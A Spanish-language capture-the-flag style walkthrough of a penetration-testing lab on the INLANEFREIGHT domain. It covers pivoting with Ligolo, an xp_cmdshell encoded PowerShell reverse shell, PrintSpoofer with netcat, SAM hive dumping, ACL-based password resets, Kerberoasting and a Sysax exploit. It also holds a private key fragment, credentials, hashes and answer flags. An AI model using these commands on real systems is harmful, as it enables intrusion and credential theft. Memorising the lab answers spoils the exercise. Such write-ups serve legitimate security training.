OjeHiTG8YGZXV0sP6FVJcwfoGjeOFnSOsbZjpV3bny3gOicFQMDtikPsX7fewO6JZ22fFv
YSr65BXRSi154Hwl7F5AH1Yb5mhSRgYAAjZm4I5nxT9J2kB61N607X8v93WLy3/AB9zKzl
avML095PJiIsxtpkdO51TXOxGzgbE0TM0FgZzTy3NB8FfeaXOmKUObznvbnGstZVvitNJF
FMFr+APR1Q3WG1LXKA6ohdHhfSwxE4zdq4cIHyo/cYN7baWIlHRx5Ouy/rU+iKp/xlCn9D
hnx8PbhWb5ItpMxLhUNv9mos/I8oqqcFTpZCNjZKZAxIs/RchduAQRpxuGChkNAJPy6nLe
xmCIKZS5euMwXmXhGOXi0r1ZKyYCxj8tSGn8VWZY0Enlj+PIfznMGQXH6ppGxa0x2BAAAA
wESN/RceY7eJ69vvJz+Jjd5ZpOk9aO/VKf+gKJGCqgjyefT9ZTyzkbvJA58b7l2I2nDyd7
N4PaYAIZUuEmdZG715CD9qRi8GLb56P7qxVTvJn0aPM8mpzAH8HR1+mHnv+wZkTD9K9an+
L2qIboIm1eT13jwmxgDzs+rrgklSswhPA+HSbKYTKtXLgvoanNQJ2//ME6kD9LFdC97y9n
IuBh4GXEiiWtmYNakti3zccbfpl4AavPeywv4nlGo1vmIL3wAAAMEA7agLGUE5PQl8PDf6
fnlUrw/oqK64A+AQ02zXI4gbZR/9zblXE7zFafMf9tX9OtC9o+O0L1Cy3SFrnTHfPLawSI
nuj+bd44Y4cB5RIANdKBxGRsf8UGvo3wdgi4JIc/QR9QfV59xRMAMtFZtAGZ0hTYE1HL/8
sIl4hRY4JjIw+plv2zLi9DDcwti5tpBN8ohDMA15VkMcOslG69uymfnX+MY8cXjRDo5HHT
M3i4FvLUv9KGiONw94OrEX7JlQA7b5AAAAwQDihl6ELHDORtNFZV0fFoFuUDlGoJW1XR/2
n8qll95Fc1MZ5D7WGnv7mkP0ureBrD5Q+OIbZOVR+diNv0j+fteqeunU9MS2WMgK/BGtKm
41qkEUxOSFNgs63tK/jaEzmM0FO87xO1yP8x4prWE1WnXVMlM97p8osRkJJfgIe7/G6kK3
9PYjklWFDNWcZNlnSiq09ZToRbpONEQsP9rPrVklzHU1Zm5A+nraa1pZDMAk2jGBzKGsa8
WNfJbbEPrmQf0AAAALcm9vdEB1YnVudHU=
-----END OPENSSH PRIVATE KEY-----
```

Lo guardamos en nuestra kali como **id_rsa** le damos el permiso `chmod 600 id_rsa` e iniciamos una ssh junto al archivo

```
ssh -i id_rsa root@monitoring.inlanefreight.local
for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from
```

Realizando este comando compruebo que mi maquina compartes direcciones con otras ip como **172.16.8.3** **172.16.8.20** **172.16.8.50** y la ip **172.16.8.120** es de la maquina donde ejecutamos el comando

<p align="center"> 
<img src="images/ipsss.png" width="600" alt="Resultado de Nmap">
</p>

```
hostname -I
```

La ip principal de la máquina es **10.129.118.60** pero su ip privada es **172.16.8.120** que esta última nos servirá para conectarnos a las otras ip. Para llevar acabo esto usaremos la herramienta **Ligolo**

<p align="center"> 
<img src="images/hostname.png" width="600" alt="Resultado de Nmap">
</p>

En esta [pagina](https://github.com/nicocha30/ligolo-ng/releases) llevaremos acabo la descarga de ligolo y descargaremos **ligolo-ng_agent_0.9_linux_amd64.tar.gz** y **ligolo-ng_proxy_0.9_linux_amd64.tar.gz**

```
tar -xvf ligolo-ng_proxy_0.9_linux_amd64.tar.gz
```

Con los siguientes comandos configuramos **proxy** y lo activamos.

```
sudo ip tuntap add user dani mode tun ligolo  
sudo ip link set ligolo up
sudo ./proxy -selfcert
```

Con el siguiente comando descargamos ligolo **agente** para la maquina objetivo. 

```
tar -xvf ligolo-ng_agent_0.9_linux_amd64.tar.gz
```

Una vez descargado tendremos que enviarlo a nuestra maquina objetivo:

```
python3 -m http.server 80
```

En la maquina objetivo nos situamos en la carpeta **/tmp**, lo descargamos y activamos.

```
wget http://10.10.15.109:80/agent
chmod +x agent
./agent -connect 10.10.15.109:11601 -ignore-cert
```

<p align="center"> 
<img src="images/agentligolo.png" width="600" alt="Resultado de Nmap">
</p>

**Importante tenderemos que hacer después si o si este comando, dependiendo de la ip lo tendremos que editar pero siempre en /24.**

```
sudo ip route add 172.16.8.0/24 dev ligolo
```

Lo último que quedaría sería volver donde hemos iniciado ligolo e realizar los siguientes comandos:

```
session
1
start
```

<p align="center"> 
<img src="images/ligolo proxy.png" width="600" alt="Resultado de Nmap">
</p>

Comprobamos si tenemos ping con la ip **172.16.8.120**

```
ping -c 1 172.16.8.120 
```

<p align="center"> 
<img src="images/ping172168120.png" width="600" alt="Resultado de Nmap">
</p>

Usamos la herramienta **fping** para guardar las ips que vimos antes en un .txt

```
fping -asgq 172.16.8.0/24 > hosts.txt
nmap -A -iL hosts.txt 
```

Reporte de la ip **172.16.8.3**

> Es el controlador de dominio y ejecuta servicios relacionados con Active Directory (Kerberos, LDAP, etc.).

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-22 17:07:58Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
```

Reporte de la ip **172.16.8.20**

> Ejecuta SMB, RPC, RDP, nlockmgr y un sitio web HTTP.

```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Home
| http-robots.txt: 16 disallowed entries (15 shown)
| /*/ctl/ /admin/ /App_Browsers/ /App_Code/ /App_Data/ 
| /App_GlobalResources/ /bin/ /Components/ /Config/ /contest/ /controls/ 
|_/Documentation/ /HttpModules/ /Install/ /Providers/
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: ACADEMY-AEN-DEV
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2026-07-22T17:08:46+00:00
| ssl-cert: Subject: commonName=ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL
| Not valid before: 2026-07-21T14:56:58
|_Not valid after:  2027-01-20T14:56:58
|_ssl-date: 2026-07-22T17:08:55+00:00; +7s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
```

Reporte de la ip **172.16.8.50**

> Ejecuta SMB, RPC, RDP y un proxy HTTP en el puerto 8080.

```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=ACADEMY-AEN-MS01.INLANEFREIGHT.LOCAL
| Not valid before: 2026-07-21T14:57:02
|_Not valid after:  2027-01-20T14:57:02
|_ssl-date: 2026-07-22T17:08:55+00:00; +7s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: ACADEMY-AEN-MS0
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: ACADEMY-AEN-MS01.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2026-07-22T17:08:44+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp open  http          Apache Tomcat (language: en)
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/10.0.21
```

La ip **172.16.8.20** es lo que contiene el **NFS** por tanto, para construir su montura haremos lo siguiente:

```
showmount -e 172.16.8.20
sudo mkdir -p DEV01
sudo mount -t nfs 172.16.8.20:/DEV01 DEV01
ls -la DEV01
cat DEV01/flag.txt 
```

<p align="center"> 
<img src="images/showmount1.png" width="600" alt="Resultado de Nmap">
<img src="images/DEV0111.png" width="600" alt="Resultado de Nmap">
</p>

answer: **bf22a1d0acfca4af517e1417a80e92d1**

### Exploitation & Privilege Escalation

1. **Retrieve the contents of the SAM database on the DEV01 host. Submit the NT hash of the administrator user as your answer.**

En esta actividad seguiremos trabajando con la pagina web `http://monitoring.inlanefreight.local` y continuamos donde nos quedamos en la actividad anterior, ya habiendo usado la herramienta **ligolo**

Hay que tener en cuenta las siguientes ip:

IP Principal --> **172.16.8.120**
IP Objetivo --> **172.16.8.20**

Accedemos en el navegador e introducimos la siguiente url `http://172.16.8.20/` 

Credenciales --> `Administrator:D0tn31Nuk3R0ck$$@123`

Estas credenciales la encontramos en la carpeta compartida del ejercicio anterior dentro de la carpeta **DNN** dentro del archivo **web.config**

<p align="center"> 
<img src="images/credencialadministraf.png" width="600" alt="Resultado de Nmap">
</p>

Una vez introducido las credenciales accedemos a la pagina web

<p align="center"> 
<img src="images/engranaje20.png" width="600" alt="Resultado de Nmap">
</p>

Clicamos en el engranaje y accedemos a **sql console**

<p align="center"> 
<img src="images/sqlconsole.png" width="600" alt="Resultado de Nmap">
</p>

Dentro de la consola escribimos lo siguiente: 

```
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', '1'
RECONFIGURE
```

Este script de SQL Server sirve para **habilitar la funcionalidad `xp_cmdshell`**, la cual permite ejecutar comandos del sistema operativo (como si estuvieras en la consola de Windows/CMD) directamente desde el gestor de base de datos.

<p align="center"> 
<img src="images/runscruipt.png" width="600" alt="Resultado de Nmap">
</p>

```
xp_cmdshell 'whoami'
```

<p align="center"> 
<img src="images/whoamiii-1.png" width="600" alt="Resultado de Nmap">
</p>

Como ahora nos funciona los comandos como **whoami** el objetivo será trasladar esta sesión a una reverse shell para ello nos informaremos de que sistema se trata 

```
EXEC xp_cmdshell 'systeminfo';
```

<p align="center"> 
<img src="images/systeminfo.png" width="600" alt="Resultado de Nmap">
</p>

Luego como esta pagina está conectada a esta ip **172.16.8.120** (dmz01) desde aquí prepararemos el puerto de escucha 

```
nc -lvnp 4449
```

Volviendo a la pagina web en el apartado **sql console** pegaremos el siguiente payload que se consigue desde esta pagina [revershell](https://www.revshells.com/)

```
xp_cmdshell 'powershell -e "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgA4AC4AMQAyADAAIgAsADQANAA0ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"'
```

<p align="center"> 
<img src="images/powershelllbase64.png" width="600" alt="Resultado de Nmap">
</p>

Una vez obtenida la revershell miramos los permisos del usuario

```
whoami
whoami /priv
```

<p align="center"> 
<img src="images/permisos.png" width="600" alt="Resultado de Nmap">
</p>

> **SeImpersonatePrivilege** es un privilegio de seguridad en Windows que permite a un programa o servicio **actuar en nombre de otro usuario** después de que este se haya autenticado.

Para explotar este permiso usaremos dos herramientas: [PrintSpoofer64.exe](https://github.com/itm4n/PrintSpoofer/releases) y [nc.exe](https://github.com/int0x33/nc.exe/)

El objetivo es trasladar estas herramientas a la maquina **Windows**, pero antes tiene que pasar por la maquina **dmz01** Por tanto, los pasos será el siguiente:

Donde tenemos las herramienta descargada escribimos en el siguiente comando

```
python3 -m http.server 80
```

En la maquina **dmz01** nos iremos a la carpeta **/tmp**

```
wget http://10.10.15.109:80/PrintSpoofer64.exe
wget http://10.10.15.109:80/nc64.exe
```

Una vez descargado, escribimos el siguiente comando:

```
python3 -m http.server 81
```

En la maquina windows, en la raiz creamos una carpeta llamada **tools** y dentro descargamos las siguientes herramientas.

```
certutil.exe -urlcache -f http://172.16.8.120:81/PrintSpoofer64.exe .\PrintSpoofer64.exe
certutil.exe -urlcache -f http://172.16.8.120:81/nc64.exe .\nc64.exe
```

En la maquina **dmz01** preparamos el puerto de escucha:

```
nc -lvnp 4460
```

En la maquina windows escribimos el siguiente comando:

```
.\PrintSpoofer64.exe -c ".\nc64.exe 172.16.8.120 4460 -e cmd"
```

<p align="center"> 
<img src="images/authorityyy.png" width="600" alt="Resultado de Nmap">
</p>

Unas vez obtenida el máximo privilegio en **windows**, como el objetivo de la actividad es obtener el hash ntlm del usuario administrador tenemos que descargar **SAM**, **SECURITY**, **SYSTEM**

Para ello en el navegador nos situaremos en:

```
http://172.16.8.20/admin/file-management
```

En la sesión de máximo privilegio de windows nos situamos en `C:\DotNetNuke\Portals\0`:

Nos situamos porque en esa carpeta: **C:\DotNetNuke\Portals\0** es el directorio raíz que se mapea a `http://172.16.8.20/admin/file-management` — es decir, cualquier archivo que guardemos ahí se vuelve descargable desde el navegador.

```
reg save HKLM\SAM .\SAM
reg save HKLM\SECURITY .\SECURITY
reg save HKLM\SYSTEM .\SYSTEM
```

<p align="center"> 
<img src="images/SSSSSS.png" width="600" alt="Resultado de Nmap">
</p>

```
move SAM SAM.png
move SECURITY SECURITY.png
move SYSTEM SYSTEM.png
```

Lo cambiamos a **.png** para que los archivos pesen menos

<p align="center"> 
<img src="images/imageneespng.png" width="600" alt="Resultado de Nmap">
</p>

Luego, descargamos uno a uno cada "imagen" y lo trasladamos en una carpeta de mi maquina kali.

```
python3 /home/dani/Escritorio/Herramienta/impacket-0.9.24/build/scripts-3.13/secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

<p align="center"> 
<img src="images/hashntlmadmin.png" width="600" alt="Resultado de Nmap">
</p>

answer: **0e20798f695ab0d04bc138b22344cea8**

2. **Escalate privileges on the DEV01 host. Submit the contents of the flag.txt file on the Administrator Desktop.**

Como somos en nuestra sesión de windows admin prácticamente podemos conseguir la flag.txt con el siguiente comando

```
type C:\Users\Administrator\Desktop\flag.txt
```

answer: **K33p_0n_sp00fing!**

## Lateral Movement & Privilege Escalation

### Lateral Movement

1. **Find a backup script that contains the password for the backupadm user. Submit this user's password as your answer.**

En esta actividad seguiremos trabajando en la pagina web `http://monitoring.inlanefreight.local` y seguiremos trabajando con la sesión de la actividad anterior.

A continuación tendremos que usar una herramienta llamada **powerview.ps1** y lo tendremos que pasar a nuestra maquina windows.

En la maquina kali.

```
python3 -m http.server 80
```

En la maquina **dmz01**

```
wget http://10.10.15.109:80/powerview.ps1
python3 -m http.server 81
```

En la maquina Windows:

```
certutil.exe -urlcache -f http://172.16.8.120:81/powerview.ps1 .\powerview.ps1
```

A continuación, usando la herramienta **PowerView.ps1** para infórmanos sobre el usuario **hporter**

```
powershell
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid hporter
Get-DomainObjectACL -ResolveGUIDs -Identity * | ?{$_.SecurityIdentifier -eq $sid}
```

Podemos observar que el usuario **'hporter'** tiene 'User-Force-Change-Password' asignada al usuario **'ssmalls'.**

<p align="center"> 
<img src="images/User-Force-Change-Password.png" width="600" alt="Resultado de Nmap">
</p>

```
Invoke-Command -ComputerName ACADEMY-AEN-DEV01 -ScriptBlock { Get-LocalGroupMember -Group 'Remote Desktop Users' }
```

Podemos observar que todos los usuarios del dominio (incluido 'hporter') pueden conectarse a DEV01 mediante RDP.

<p align="center"> 
<img src="images/Domains users.png" width="600" alt="Resultado de Nmap">
</p>

Iniciaremos una conexión RDP a DEV01 usando el usuario 'hporter' (según consta en la sección 'Recopilación de información interna', donde se indica que DEV01 tiene acceso RDP).

```
xfreerdp /v:172.16.8.20 /u:hporter /p:'Gr8hambino!' /dynamic-resolution
```

```
cd /tools
powershell
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity ssmalls -AccountPassword (ConvertTo-SecureString 'dani123' -AsPlainText -Force) -Verbose
```

Usaremos el permiso **Set-DomainUserPassword** en el usuario **hporter** para cambiarle la contraseña al usuario **ssmalls**

<p align="center"> 
<img src="images/ssmalls.png" width="600" alt="Resultado de Nmap">
</p>

Luego en mi maquina objetivo hago el siguiente comando:

```
crackmapexec smb 172.16.8.3 -u ssmalls -p dani123 --shares
```

<p align="center"> 
<img src="images/smallssss.png" width="600" alt="Resultado de Nmap">
</p>

```
mkdir imported_data
sudo mount -t cifs //172.16.8.3/"Department Shares"
imported_data -o username=ssmalls,password=dani123
tree
```

<p align="center"> 
<img src="images/treeeeeee.png" width="600" alt="Resultado de Nmap">
</p>

```
cat "IT/Private/Development/SQL Express Backup.ps1" 
```

<p align="center"> 
<img src="images/backup.png" width="600" alt="Resultado de Nmap">
</p>

Credenciales **backupadm**:**!qazXSW@**

2. **Perform a Kerberoasting attack and retrieve TGS tickets for all accounts set as SPNs. Crack the TGS of the backupjob user and submit the cleartext password as your answer.**

En esta actividad tendremos que volver a la session **dmz01** siendo el usuario de máximo privilegio

```
powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -SPN -Verbose | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation
```

<p align="center"> 
<img src="images/getdimainuserrr.png" width="600" alt="Resultado de Nmap">
</p>

Este comando lo que hará es descárganos un archivo llamado **ilfreight_spns.csv** Este archivo hay que trasladarlo a nuestra carpeta compartida de windows

```
move .\ilfreight_spns.csv C:\DotNetNuke\Portals\0
```

Luego en el navegador, nos iremos a esta pagina web `http://172.16.8.20/admin/file-management` para visualizar el archivo **.csv** tendremos que irnos a:

**settings** - **Security** - **More** - **More Security Settings**.

<p align="center"> 
<img src="images/extensiones.png" width="600" alt="Resultado de Nmap">
</p>

Volviendo a la pagina anteriormentemente nombrada observamos ya podemos ver el archivo **.csv**

<p align="center"> 
<img src="images/cssssssv.png" width="600" alt="Resultado de Nmap">
</p>

```
cat ilfreight_spns.csv | grep 'backupjob'
```

> "$krb5tgs$23$*backupjob$INLANEFREIGHT.LOCAL$backupjob/veam001.inlanefreight.local*$1F3D6BD01C2FD85E328FE46D438AFB48$6283A611AAC6296E7834F207F0CD89420B578EC46A9F1C415E789AF2C3C79596DEF7C20D83F82DC5D05EBE523A25BD62F7D8F8AB530BCFE4484EA37D8E9367E489E3DB148A274DA7FAC0A2D72E8B08E7A9406C21D991FED6909DEEA97FF28EE8ED7A77D8657EC2F07F4AF553E9047A4BB9960A718A88EF73E7C50053A94917D7A95EB8353BE81591DE3ACF9023EBE543A721FA8215BCF8962B712EAFAA8E7708EFE3384D683D11CB0A87B83393D3FA44BA70CEE4F384F68CF46356390A4960D9708B5126589A53C859928C237779B270F110C3E72DAAED7BE4FBA223E39E9367F380E57618AE6CFE084BBD4AA0FAB6BEEBAF2405BBEDFE85644FA8DD7221387C45725A328B5E8FD481A342C149CF04FBEC0DC7BC74C622C57F5D6DB4D9761C82A45F19167ADC610CE6E7855480921BE62FA4D97FED1BB273669868968935A47401EF05D3D573E7C81661039B337047FC9CC528597A1298C58DEB29B2C962F6522F663BD0C9DC4D18F66D9590C2425C367DC24C53DE5A7753A7F2836F0345E7C0B69B55298031C354F90EE1789B129317BAB2D7085C027B6F24FE25D80465ED73CB33658F326D135009BA3C09522B1532308EE88F32C35B4096CB3D18C0DB37B26F7E2CCABC69C43E6B2DD9B89F6410796BE11E7069E6FB63D39EF5B920F6B02A2B124738DE71EF89C21C12F4A22CDC06C09EAEC49E534D714E06D278E7E208583AA32A3436D197507F80D3DF31E16E0F56792B3A1F4219DB5018D1BF4BF4F36BA4A2A6BE85C2E70D6BEBB5AED96CFE35C667C191FE41C86E127F3AE29384B7E3250394E8EB145616F9A4863CC5DB668910CF05D0D8D2A03D27DDDF8FE6C6968C9FC5C51493B87A6FD1A2CC0227C163AA558205DD59A3BD80C2EF926DCAA8670A3C1C3EE3D9F3DAE19B824737840FECB4400E4B1D4FE217A678C0C23E39CAD7D2ECD7DC02CE393BDE92C67DD2068B9AA08FAF7127F618B4FAAAAF590C485CF13BCBB91CCACC10818D84E9D93AB4D75BEFB385AADE23B0C00A5ADC4C9AA6CFF6AC256578451E9CC6B9BA1EECBDB19E55F8F99E9A5BA8E1CE57462BDC86324E27C560E77AECE0A2EBAA8DE56714CE812AB1AEDF14453D02BFBC0BF910BE72620C603C45B31B762324966BB08B986A369ED415A1A22D25D37CD4B2F6CFEC703B73AA4E67EE1E672251BF94975E7B2D1A7A9B7FBE1278D5F159576A2E3709F5723C00524E21A53777FBD1E9CC14FF7BE5CB17C9AA51634BBF31FCD759368832AF1291986DBF6CC792C32A3E55852B841CE4BE24BFB5290585DA2AFBB37E1B97DD2D3F963102256EF7B72D26ECA7480E83D473A8F2E2941ECD152DAE981293BED9BEE97E28B0A7F5DDF3000E159EBA2D920D93128ADC6907EC0EE04FD480DB8A0BC33EED191C61ACDFBB02CCF106292049471F45A26071C571DBADE75C13042B1BB650530D037B558459703A62CE71DC9386D9742B14031CE3772B125283999D29B0F1D4B80B8DC2B8F50448D74AF0CEFB5638327E5EB759AD69AA30EE2A2EA7C064EEE57BDB6306C1FA4520EE4AAB09E9CA2C49AA5D81F96E0EB7496F93FF8EB76623647DE1D7AA9B50D092ED7BD1728BB374F9DC9FFAFB63D37F284B932A40F585E5EC29432BCD6A"

Lo guardamos en un archivo llamado **hash.txt**

```
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

answer: **lucky7**

3. **Escalate privileges on the MS01 host and submit the contents of the flag.txt file on the Administrator Desktop.**

Por eliminación, podemos saber que MS01 es 172.16.8.50 y, según el análisis de nmap, sabemos que tiene WinRM (puerto 5985) abierto, Por tanto, desde nuestra kali haremos el siguiente comando:

```
evil-winrm -i 172.16.8.50 -u backupadm -p '!qazXSW@'
```

Investigando en la siguiente ruta encontré algo muy interesante

```
type C:\panther\untend.xml
```

<p align="center"> 
<img src="images/userpasss.png" width="600" alt="Resultado de Nmap">
</p>

```
xfreerdp /v:172.16.8.50 /u:ilfserveradm /p:Sys26Admin /dynamic-resolution
```

```
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
```

- **`HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*`**: En Windows, la información de las aplicaciones instaladas se guarda en el Registro del sistema. Esta ruta específica contiene la lista de programas nativos (64 bits).

- **`Get-ItemProperty`**: Lee todas las entradas (claves) que están guardadas en esa carpeta del Registro.

- **`|` (Pipeline/Tubería)**: Pasa la información obtenida al siguiente comando.

- **`Select-Object DisplayName, DisplayVersion, InstallLocation`**: Filtra los datos para quedarse solo con tres atributos útiles:

    - **DisplayName:** Nombre del programa.

    - **DisplayVersion:** Versión instalada.

    - **InstallLocation:** Carpeta donde está instalado.

- **`$INSTALLED =`**: Guarda la lista resultante dentro de la variable `$INSTALLED`.

```
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
```

- **`HKLM:\Software\Wow6432Node\...`**: La carpeta `Wow6432Node` en el Registro guarda los datos de programas antiguos o aplicaciones desarrolladas en 32 bits.

- **`$INSTALLED +=`**: El operador `+=` significa "añadir a lo que ya teníamos". Toma la lista de programas de 32 bits y la suma a los programas de 64 bits que ya habíamos guardado en la variable `$INSTALLED`.

```
$INSTALLED | Where-Object { $_.DisplayName -ne $null } | Sort-Object -Property DisplayName -Unique | Format-Table -AutoSize
```

- **`$INSTALLED |`**: Toma la lista completa con todos los programas recolectados.

- **`Where-Object { $_.DisplayName -ne $null }`**: Elimina entradas vacías del Registro que no corresponden a un programa real (filtra los registros donde el nombre `DisplayName` no es nulo/vacío).

- **`Sort-Object -Property DisplayName -Unique`**:

    - **`Sort-Object`**: Ordena la lista alfabéticamente por el nombre del programa (`DisplayName`).

    - **`-Unique`**: Elimina programas duplicados para no ver la misma aplicación repetida varias veces.

- **`Format-Table -AutoSize`**: Muestra el resultado final en la pantalla formateado como una tabla con columnas alineadas automáticamente.

En conclusión, estamos extrayendo el equivalente a la lista de **"Programas y características" (Panel de control)** de Windows directamente desde la consola.

<p align="center"> 
<img src="images/sysaxftp6.png" width="600" alt="Resultado de Nmap">
</p>

> **Sysax FTP Automation 6** es un software cliente avanzado para sistemas operativos Windows diseñado para automatizar la transferencia y sincronización de archivos. Permite programar tareas complejas sin intervención humana.

Sigo buscando en el navegador algún exploit relacionado a **Sysax FTP Automation 6** me encuentro con lo siguiente [Sysax FTP Automation 6](https://www.exploit-db.com/exploits/50834)

A continuación, voy a explotar la aplicación para agregar nuestro usuario **ilfserveradm** al grupo de administradores, En primer lugar creamos un archivo llamando **pwn.bat.txt** en documents dandole a **click derecho del raton** - **new** - **Text Document**

<p align="center"> 
<img src="images/documents.png" width="600" alt="Resultado de Nmap">
</p>

Con el siguiente contenido:

```
net localgroup administrators ilfserveradm /add
```

Luego en la powershell haremos el siguiente comando:

```
ren C:\Users\ilfserveradm\Documents\pwn.bat.txt pwn.bat
```

Después, nos situamos en **C:\Program Files (x86)\SysaxAutomation** y clikamos en **sysaxschedscp.exe**

Seleccionamos **Setup  Scheduled/Triggered Tasks**

<p align="center"> 
<img src="images/setuppp.png" width="600" alt="Resultado de Nmap">
</p>

Luego a **Add Task (Triggered)**

<p align="center"> 
<img src="images/add task.png" width="600" alt="Resultado de Nmap">
</p>

Asigne un nombre a nuestra tarea, supervise la carpeta 'C:\Users\ilfserveradm\Documents' y marque la casilla **Run task if a file is added to**
**the monitor folder or subfolder(s)’ box.**

<p align="center"> 
